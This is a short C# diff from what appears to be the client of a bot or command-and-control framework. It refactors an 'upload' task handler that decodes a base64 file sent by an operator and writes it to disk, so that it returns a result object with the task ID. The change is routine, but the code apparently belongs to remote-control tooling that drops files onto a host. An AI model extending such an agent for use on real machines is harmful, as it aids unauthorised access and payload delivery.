@@ -9,7 +9,7 @@ namespace pattaya_project_client.Commands.Implements
     {
         public override string TaskName => "upload";
 
-        public override string RunTask(BotTask task)
+        public override BotTaskResult RunTask(BotTask task)
         {
             string filename;
             if(task.IncomingFilename is null || task.IncomingFilename == "")
@@ -25,7 +25,12 @@ namespace pattaya_project_client.Commands.Implements
             byte[] bytes = Convert.FromBase64String(task.IncomingFile);
             File.WriteAllBytes(filename, bytes);
 
-            return $"Saved {filename} to {Directory.GetCurrentDirectory()}";
+            
+            return new BotTaskResult
+            {
+                TaskId = task.TaskId,
+                Result = $"Saved {filename} to {Directory.GetCurrentDirectory()}"
+            };
         }
     }
 }
